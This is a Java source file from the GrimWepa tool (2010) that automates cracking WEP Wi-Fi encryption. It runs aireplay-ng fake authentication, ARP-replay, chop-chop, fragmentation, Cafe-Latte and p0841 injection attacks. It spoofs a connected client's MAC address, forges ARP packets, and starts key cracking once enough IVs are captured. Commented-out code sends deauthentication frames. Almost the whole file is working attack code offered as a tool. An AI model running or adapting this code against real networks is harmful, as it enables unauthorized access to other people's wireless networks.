/**
 * Depending on what the user chose, runs the WEP attack
 * used different thread (implements Runnable) so as to multi-thread it.
 * Copyright 2010 Derv Merkler
 */

import java.io.*;
import java.util.*;
import javax.swing.JOptionPane;

// WEP Attacks (all of them!)

public class wepattack1 implements Runnable {
	Thread t;
	public static boolean flag;
	public static Process profrag = null;
	public static Process profrag2 = null;
	public boolean started_autocrack = false;
	
	public wepattack1() {
		t = new Thread(this, "WEP Attack 1");
		flag = false;
	}
	public boolean fileExists(String filename) {
		File f = new File(filename);
		return f.exists();
	}
	public void run() {
		String line, wificard, client = "";
		Process proauth = null, promac = null; //, proshared = null, proshareddeauth = null;
		BufferedReader in = null;
		started_autocrack = false;
		String keystream = "";
		test2.stat("Initializing...");
		
		// get wifi card (found in test2.java)
		wificard = (String)test2.drivers.getItemAt(test2.drivers.getSelectedIndex());
		
		String oldMAC = "";
		
		// get clients (if any are selected)
		if (test2.chkclient.isSelected() == true) {
			client = (String)test2.clients.getItemAt(test2.clients.getSelectedIndex());
			if (client.equals("[no clients found]") == true)
				client = "";
			else {
				// CHANGE MAC HERE
				oldMAC = getMac(wificard);
				changeMac(client);
				client = " -h " + client;
			}
		}
		if (client.equals("") == true) {
			// run fake auth in the background, only run once (for now).
			test2.stat("Fake-authenticating with Access Point...");
			try {
				proauth = Runtime.getRuntime().exec(
					"aireplay-ng -1 0 -a " + test2.currentBSSID + " -T 1 " + wificard);
				// only tries to fake-auth once.
				in = new BufferedReader(new InputStreamReader(proauth.getInputStream()));
				line = null;
				boolean associate = false;
				while ( (line = in.readLine()) != null) {
					if (line.indexOf("Association successful") >= 0) {
						// we've associated successfully
						associate = true;
						break;
					} else if (line.indexOf("rejects open-system auth") >= 0) {
						// SharedWEP! ffffffuuuuuuuuuuuuuu
						/*
						// set our mac to the client's
						oldMAC = getMac(wificard);
						// and that's it!
						if (client.replace(" -h ", "").equals(oldMAC) == false) {
							// client != our mac address
							promac = Runtime.getRuntime().exec(
								"ifconfig " + wificard + " down");
							promac.waitFor();
							promac.destroy();
							pause(0.1);
							promac = Runtime.getRuntime().exec(
						"macchanger -m " + client.replace(" -h ", "") + " " + wificard);
							promac.waitFor();
							promac.destroy();
							pause(0.1);
							promac = Runtime.getRuntime().exec(
								"ifconfig " + wificard + " up");
							promac.waitFor();
							promac.destroy();
						} else
							oldMAC = "";
						*/
						
						// old method: open airodump-ng, listening for shared key
						/*proshared = Runtime.getRuntime().exec(
							"airodump-ng -c " + test2.currentChannel +
							" --bssid " + test2.currentBSSID + " -w shared " + wificard);
						// wait for:
						// shared-" + currentBSSID.replaceAll(":", "-") + ".xor"
						while ( 
						    (fileExists("shared-" + test2.currentBSSID.replaceAll(":", "-") + 
						    ".xor") == false) && 
						    (flag == false)) {
							// deauth the client!
							test2.stat("Waiting for shared key...");
							proshareddeauth = Runtime.getRuntime().exec(
								"xterm -fg green -bg black -geom 100x15+0+225 -iconic -e " + 
								"aireplay-ng -0 3 -a " + 
								test2.currentBSSID + 
								"" + client.replaceAll(" -h ", " -c ") +
								" " + wificard); 
							proshareddeauth.waitFor();
							proshareddeauth.destroy();
							pause(5); // wait 5 seconds for next deauth
						}
						if (fileExists("shared-" + test2.currentBSSID.replaceAll(":", "-") + 
							".xor") == true) {
						}
						proshared.destroy();
						*/
					}
				}
				
				proauth.waitFor();
				
				if (associate == false) {
					// check for intel chipset!
					boolean hasintel = false;
					test2.prointel = null;
					BufferedReader brintel = null;
					String lintel;
					try {
						test2.prointel = Runtime.getRuntime().exec("airmon-ng");
						brintel = new BufferedReader(new InputStreamReader(test2.prointel.getInputStream()));
						while ( (lintel = brintel.readLine()) != null) {
							if ( (lintel.indexOf(wificard) >= 0) && (lintel.indexOf("Intel 4965") >= 0) ) {
								hasintel = true;
								break;
							}
						}
						test2.prointel.waitFor();
						test2.prointel.destroy();
					} catch (IOException ioe) {
						ioe.printStackTrace();
					} catch (InterruptedException ie) {
						ie.printStackTrace();
					}
					// if they DO have the intel chipset
					if (hasintel == true) {
						int answer = JOptionPane.showConfirmDialog(null,
						 "Fake Authentication was Unsuccessful, but GrimWepa " +
						 "has noticed that you *might* be using an Intel 4965/5xxx chipset.\n\n" +
						 "Do you want to attempt the wpa_supplicant work-around for this chipset?\n\n" +
						 "Selecting No will continue the attack, despite failure.",
						 "GRIM WEPA | wpa_supplicant?",
						 JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
						if (answer == JOptionPane.YES_OPTION) {
							// run the code
							
							try {
								// create fake.conf with proper SSID
								test2.stat("Creating fake.conf file...");
								test2.prointel = Runtime.getRuntime().exec(test2.fixArgumentsPath(
		"echo 'network={ \n ssid=\"" + test2.currentSSID + "\" \n key_mgmt=NONE \n wep_key0=fakeauth \n }' > " + 
			"!PATH!fake.conf"));
								test2.prointel.waitFor();
								test2.prointel.destroy();
								
								// now we run wpa_supplicant *INDEFINITELY!!!* until they crack it or hit stop
								test2.stat("Running wpa_supplicant indefinitely...");
								test2.prointel = Runtime.getRuntime().exec(test2.fixArgumentsPath(
			"wpa_supplicant -c !PATH!fake.conf -i " + wificard + " -Dwext -B"));
							} catch (IOException ioe) {
								ioe.printStackTrace();
							} catch (InterruptedException ie) {
								ie.printStackTrace();
							}
							pause(2);
						} else {
							test2.stat("Continuing attack, despite failure");
							pause(2);
						}
					} else {
						int answer = JOptionPane.showConfirmDialog(null, 
						"Fake Authentication was UNSUCCESSFUL!\n\n" + 
						"Possible reasons for this include:\n" + 
						"\tWiFi card doesn't support injection,\n" + 
						"\tAccess Point uses Shared Key Authentication (SKA),\n\n" +
						"Would you like to continue with the attack?",
						"GRIM WEPA | ERROR",
						JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
						
						if (answer == JOptionPane.YES_OPTION) {
							test2.stat("Continuing attack, despite failure");
							pause(2);
						} else {
							flag = true;
							test2.stat("Stopping attack");
						}
					}
					// test2.stat("Authentication FAILED!  Try a client-based attack instead!");
					// pause(5);
				} else {
					test2.stat("Authentication successful :D");
					pause(1);
				}
			} catch (InterruptedException ie) {
				ie.printStackTrace();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			} finally {
				proauth.destroy();
				try {
					in.close();
				} catch(IOException ioe) {
					ioe.printStackTrace();
				}
			}
			
			client = " -h " + getMac(wificard);
		}
		
		switch(test2.wepattack.getSelectedIndex()) {
		case 1: // ARP-Replay Attack
			test2.stat("Running ARP-Replay Attack; Auto-Crack at 10,000+ IVs");
			try {
				String xterm;
				if (test2.hideWin.isSelected() == true)
					xterm = "";
				else
					xterm = "xterm -fg green -bg black -geom 100x15+0+225 -iconic -e ";
				profrag2 = Runtime.getRuntime().exec(
						xterm + 
						"aireplay-ng -3 -b " + test2.currentBSSID + 
						"" + client + " -x " + 
						test2.inslider.getValue() + " " + wificard);
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				profrag2.destroy();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			
			break;
		case 2: // Chop-Chop Attack
		case 3: // Fragmentation Attack
			
			// delete old arp replay file
			try {
				profrag = Runtime.getRuntime().exec("rm -rf arprequest");
				profrag.waitFor();
				profrag.destroy();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			} catch(InterruptedException ie) {
				ie.printStackTrace();
			}
			
			if (test2.wepattack.getSelectedIndex() == 2) {
				// chop chop
				test2.stat("Starting Chop-Chop Attack...");
				
				// start chopchop attack
				while ( (flag == false) && (keystream.equals("") == true) ) {
					try {
						String xterm;
						//if (test2.hideWin.isSelected() == true)
							xterm = "";
						//else
						//	xterm = "xterm -fg green -bg black -geom 100x15+0+225 -iconic -e ";
						profrag = Runtime.getRuntime().exec(
							xterm + 
							"aireplay-ng -4 " + client + 
							" -b " + test2.currentBSSID + 
							" -x " + test2.inslider.getValue() +
							" -F " + wificard);
						in = new BufferedReader(new InputStreamReader(profrag.getInputStream()));
						
						test2.stat("Waiting for data packets...");
						
						line = null;
						while ( (line = in.readLine()) != null) {
							if (line.indexOf("Saving keystream in") >= 0) {
								// this contains the keystream!
								keystream = line.substring(20);
								in.close();
								break;
							} else if (line.indexOf("Failure: ") >= 0) {
								flag = true;
								test2.stat("Chop-chop attack failed! Try Fragmentation instead");
							}
						}
						
						profrag.waitFor();
						profrag.destroy();
					} catch (IOException ie) {
						ie.printStackTrace();
					} catch (InterruptedException ie) {
						ie.printStackTrace();
					} finally {
						try {
							in.close();
						} catch(IOException ioe) {
							ioe.printStackTrace();
						} catch(NullPointerException npe) {
							npe.printStackTrace();
						}
					}
					
				} // while ( (flag == false) && (keystream.equals("") == true) );
			} else {
				test2.stat("Starting fragmentation attack...");
				
				// start fragmentation attack
				while ( (flag == false) && (keystream.equals("") == true) ) {
					try {
						String xterm;
						//if (test2.hideWin.isSelected() == true)
							xterm = "";
						//else
						//	xterm = "xterm -fg green -bg black -geom 100x15+0+225 -iconic -e ";
						profrag = Runtime.getRuntime().exec(
							xterm + 
							"aireplay-ng -5 -b " + test2.currentBSSID + 
							"" + client + " -x " + test2.inslider.getValue() + 
							" -F " + wificard);
						in = new BufferedReader(new InputStreamReader(profrag.getInputStream()));
						
						test2.stat("Waiting for data packets...");
						
						line = null;
						while ( (line = in.readLine()) != null) {
							if (line.indexOf("Saving keystream in") >= 0) {
								// this contains the keystream!
								keystream = line.substring(20);
								in.close();
								break;
							}
						}
						
						profrag.waitFor();
						profrag.destroy();
					} catch (IOException ie) {
						ie.printStackTrace();
					} catch (InterruptedException ie) {
						ie.printStackTrace();
					} finally {
						try {
							in.close();
						} catch(IOException ioe) {
							ioe.printStackTrace();
						} catch(NullPointerException npe) {
							npe.printStackTrace();
						}
					}
					
				} // while ( (flag == false) && (keystream.equals("") == true) );
			}
			
			profrag.destroy();
			
			// if we have a keystream, we need to build the arp
			if (keystream.equals("") == false) {
				// if keystream != "", then we have a keystream! to the batmobile!
				test2.stat("We have a keystream! Building arp packet...");
				try {
					String mymac = getMac(wificard);
					String xterm;
					if (test2.hideWin.isSelected() == true)
						xterm = "";
					else
						xterm = "xterm -fg green -bg black -e ";
					profrag = Runtime.getRuntime().exec(
						xterm + 
						"packetforge-ng -0 -a " + test2.currentBSSID + 
						" -h " + mymac + " -k 255.255.255.255 -l 255.255.255.255 " + 
						"-y " + keystream + " -w arprequest");
					
					profrag.waitFor(); // wait for file to be generated
					
					// possibly use instream to read what packetforge-ng says
					// i think it's safe to assume packetforge would be all "here's your arp packet"
					profrag.destroy();
					
					// delete the keystream
					profrag = Runtime.getRuntime().exec("rm " + keystream);
					profrag.waitFor();
					profrag.destroy();
					
					test2.stat("Re-playing spoofed arp; Auto-Crack at 10,000+ IVS");
					// now the file 'arprequest' is the arp request we can replay over and over...
					
					if (test2.hideWin.isSelected() == true)
						xterm = "";
					else
						xterm = "xterm -fg green -bg black -e ";
					profrag2 = Runtime.getRuntime().exec(
						xterm + 
						"aireplay-ng -2 -r arprequest -x " + 
						test2.inslider.getValue() + " -F " + wificard);
				} catch (IOException ioe) {
					ioe.printStackTrace();
				} catch (InterruptedException ie) {
					ie.printStackTrace();
				}
				
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				
				profrag2.destroy();
			} else {
				// must have been stopped
				// test2.stat("WEP Fragmentation Attack Stopped");
			}
			break;
		case 4: // Cafe-Latte Attack
			test2.stat("Running Cafe-Latte Attack; Auto-Crack at 10,000+ IVs");
			try {
				String xterm;
				if (test2.hideWin.isSelected() == true)
					xterm = "";
				else
					xterm = "xterm -fg green -bg black -geom 100x15+0+225 -iconic -e ";
				profrag2 = Runtime.getRuntime().exec(
						xterm + 
						"aireplay-ng -6 " + 
						client + " " + 
						"-b " + test2.currentBSSID + 
						" -x " + test2.inslider.getValue() + " -D " + wificard);
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				profrag2.destroy();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			break;
		case 5: // p0841 Attack
			test2.stat("Running p0841 Attack; Auto-Crack at 10,000+ IVs");
			try {
				String xterm;
				if (test2.hideWin.isSelected() == true)
					xterm = "";
				else
					xterm = "xterm -fg green -bg black -geom 100x15+0+225 -iconic -e ";
				profrag2 = Runtime.getRuntime().exec(
						xterm + 
						"aireplay-ng -2 " + 
						"-b " + test2.currentBSSID + " -t 1 " + 
						"" + client + " -p 0841 -x " + 
						test2.inslider.getValue() + " -F " + wificard);
							// -m 68 -n 86 (min/max packet size)
				do {
					// keep aireplay running until they stop the attack (flag == false);
					pause(1);
					showIVS();
				} while (flag == false);
				profrag2.destroy();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
			
			break;
		default:
		}
		
		if (test2.prointel != null) {
			test2.prointel.destroy(); // kill wpa_supplicant if it's running
			test2.prointel = null;
			// delete the fake.conf file, too (later)
		}
		
		// delete all those damn replay_ packets!
		deleteAllReplay();
		
		test2.setEnable(true);
		test2.buttonStart.setLabel("Start Attack");
		
		// stop all processes.
		try {
			test2.pro1.destroy();
		} catch (NullPointerException npe) {
			npe.printStackTrace();
		}
		try {
			profrag.destroy();
		} catch (NullPointerException npe) {}
		try {
			profrag2.destroy();
		} catch (NullPointerException npe) {}
		try {
			proauth.destroy();
		} catch (NullPointerException npe) {}
		
		// change MAC back!!!
		if (oldMAC.equals("") == false) {
			changeMac(oldMAC);
		}
		
		// remove excess files
		try {
			// delete capture file... just 'cause
			profrag = Runtime.getRuntime().exec(test2.fixArgumentsPath("rm -rf !PATH!wep-01.ivs"));
			profrag.waitFor();
			profrag.destroy();
			// delete the csv file (for capturing)
			profrag = Runtime.getRuntime().exec(test2.fixArgumentsPath("rm -rf !PATH!wep-01.csv"));
			profrag.waitFor();
			profrag.destroy();
			// delete the arp request file (if we used it)
			profrag = Runtime.getRuntime().exec("rm -rf arprequest");
			profrag.waitFor();
			profrag.destroy();
			// delete the fake.conf file (incase they used wpa_supplicant)
			profrag = Runtime.getRuntime().exec(test2.fixArgumentsPath("rm !PATH!fake.conf"));
			profrag.waitFor();
			profrag.destroy();
		} catch (IOException ioe) {} catch(InterruptedException ie) {}
	}
	public void showIVS() {
		Scanner red = null;
		String line, ivs = "";
		String[] arr;
		try {
			red = new Scanner(new FileReader(test2.grimwepaPath + "wep-01.csv"));
			while (red.hasNext() == true) {
				line = red.nextLine();
				if ((line.indexOf(test2.currentBSSID) >= 0) && (line.indexOf("WEP") >= 0 )) {
					arr = line.split(", ");
					ivs = arr[10];
				}
			}
		} catch(FileNotFoundException fnfe) {}
		if (ivs.equals("") == true)
			ivs = "0";
		
		// test2.wepivs.setText("IVS: " + ivs);
		ivs = ivs.replace(" ", "");
		int count = 0;
		try {
			count = Integer.parseInt(ivs);
		} catch (NumberFormatException nfe) {}
		test2.wepivs.setText("Captured IVs: " + String.format("%,d", count));
		
		// if we haven't tried cracking yet, and we're over 10,000 IVs...
		if ( (count >= 10000) && 
		     (test2.buttonCrack.getLabel().equals("Start Cracking") == true) && 
		     (started_autocrack == false)) {
			started_autocrack = true;
			test2.wepCrack();
		}
	}
	public static void changeMac(String MAC) {
		// uses macchanger to change Mac Address
		BufferedReader in = null;
		Process promac = null;
		// wifi card name
		String line, iface = (String)test2.drivers.getItemAt(test2.drivers.getSelectedIndex());
		
		try {
			promac = Runtime.getRuntime().exec("ifconfig " + iface + " down");
			promac.waitFor();
			
			promac = Runtime.getRuntime().exec(
				"macchanger -m " + MAC + " " + iface);
			
			in = new BufferedReader(new InputStreamReader(promac.getInputStream()));
			promac.waitFor();
			
			while ((line = in.readLine()) != null) {
				if (line.indexOf("Faked MAC") >= 0) {
					// stat(line);
					break;
				} else if (line.indexOf("Can't change MAC") >= 0) {
					// stat("Error: Unable to change MAC address!");
					break;
				}
			}
			
			try {
				in.close();
			} catch(IOException ioe) {
				ioe.printStackTrace();
			}
			
			promac = Runtime.getRuntime().exec("ifconfig " + iface + " up");
			promac.waitFor();
		} catch (IOException ioe) {
			ioe.printStackTrace();
		} catch (InterruptedException iex) {
			iex.printStackTrace();
		}
	}
	public String getMac(String iface) {
		// finds macaddress of 'iface' device
		BufferedReader in = null;
		Process promac = null;
		String result = "", line;
		
		try {
			// start ifconfig on the interface, reading the info
			promac = Runtime.getRuntime().exec("ifconfig " + iface);
			in = new BufferedReader(new InputStreamReader(promac.getInputStream()));
			promac.waitFor();
			
			// go through everyline of ifconfig output
			while ((line = in.readLine()) != null) {
				if (line.indexOf("HWaddr ") >= 0) {
					result = line.substring(line.indexOf("HWaddr ") + 7, line.indexOf("HWaddr ") + 7 + 17);
					result = result.replace('-', ':');
					break;
				}
			}
			try {
				in.close();
			} catch(IOException ioe) {}
			
		} catch (IOException ie) {} catch (InterruptedException ie) {}
		
		return result;
	}
	public void deleteAllReplay() {
		Process prodel = null;
		BufferedReader in = null;
		try {
			prodel = Runtime.getRuntime().exec("ls");
			in = new BufferedReader(new InputStreamReader(prodel.getInputStream()));
			prodel.waitFor();
			
			String line = null, all = "";
			while ( (line = in.readLine()) != null) {
				all += line + "\n";
			}
			String[] halp = all.split("\n");
			for (int i = 0; i < halp.length; i++) {
				if (halp[i].length() > 10) {
					if ((halp[i].substring(0,7).equals("replay_") == true) &&
					 halp[i].substring(halp[i].length() - 3).equals("cap")) {
						prodel = Runtime.getRuntime().exec("rm " + halp[i]);
						prodel.waitFor();
					}
				}
			}
		} catch (IOException ioe) {
		} catch (InterruptedException ie) {}
		prodel.destroy();
	}
	public static void pause(double dtime) {
		// pauses for selected period of time (IN SECONDS)
		try {
			Thread.currentThread().sleep((int)(dtime * 1000));
		}
			catch (InterruptedException e) {}
	}
}